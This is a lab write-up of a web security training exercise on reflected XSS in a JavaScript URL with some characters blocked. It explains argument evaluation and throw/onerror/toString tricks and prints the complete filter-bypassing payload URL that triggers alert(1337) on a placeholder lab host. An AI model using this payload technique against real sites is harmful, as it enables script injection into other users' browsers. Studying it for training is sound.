# Lab 28: Reflected XSS in a JavaScript URL with Some Characters Blocked

## Objective

The goal of this lab was to exploit a reflected XSS vulnerability in a JavaScript URL. The application blocked certain characters to prevent JavaScript injection, so the challenge was to find another way to execute `alert()` with `1337` included in the message.

## Analysis

### 1. Finding the vulnerable JavaScript URL

The application reflected the `postId` parameter inside a JavaScript URL:

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
```

The `postId` value was inserted into the JavaScript code without sufficient protection. This provided an opportunity to break out of the existing string and inject additional expressions.

### 2. Understanding JavaScript behavior

Two small test files were used to investigate the JavaScript features needed for the exploit.

The first experiment focused on function arguments:

```javascript
let ranVar = 1;

function ranFunction(a, b) {
    return a + b;
}

console.log(ranFunction(4, 5, 6, ranVar = 13));
console.log(ranVar);
```

JavaScript evaluates all function arguments before calling the function. This means that assignments inside additional arguments are still executed, even if the function itself never uses those arguments.

The second experiment explored the combination of `throw`, the comma operator, and `toString()`:

```javascript
let x = () => {
    throw onerror = alert, 1337;
};

toString = x;

window + '';
```

The important behaviors are:

- `throw onerror = alert, 1337` assigns `alert` to the global `onerror` handler and then throws the value `1337`.
- `toString = x` replaces the global object's `toString()` method with the arrow function.
- `window + ''` forces JavaScript to convert `window` into a primitive value. During this conversion, the overridden `toString()` method is invoked.
- The arrow function executes and throws an exception. The uncaught exception triggers the assigned `onerror` handler, which calls `alert()`.

This technique makes it possible to execute JavaScript without directly writing a conventional `alert(1337)` call.

### 3. Constructing the final payload

The final payload combined these JavaScript behaviors with the vulnerable `postId` parameter:

```text
https://LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

After URL decoding, the injected JavaScript structure becomes:

```javascript
javascript:fetch(
    '/analytics',
    {method:'post', body:'/post?postId=5&'}
),
x = x => {
    throw/**/onerror = alert, 1337;
},
toString = x,
window + '',
{x: ''}
```

The expressions are evaluated as additional arguments to `fetch()`. Their execution sequence is:

1. `x = x => {...}` defines an arrow function containing the exception logic.
2. `toString = x` replaces the global `toString()` method.
3. `window + ''` triggers object-to-primitive conversion and invokes the replacement function.
4. The function assigns `alert` to `window.onerror` and throws `1337`.
5. The uncaught exception triggers the error handler, displaying an alert containing `1337`.

The `/**/` comment separates `throw` from the following expression without requiring a normal whitespace character.

## Exploitation

The final payload was placed in the `postId` parameter. When the reflected JavaScript URL was activated, the injected expressions executed.

The overridden `toString()` method triggered the exception, and the global error handler called `alert()` with a message containing `1337`.

## Result

Successfully exploited reflected XSS despite the application's character restrictions. The technique combined JavaScript argument evaluation, arrow functions, the comma operator, exception handling, and object-to-primitive conversion to achieve JavaScript execution without a conventional `alert(1337)` call.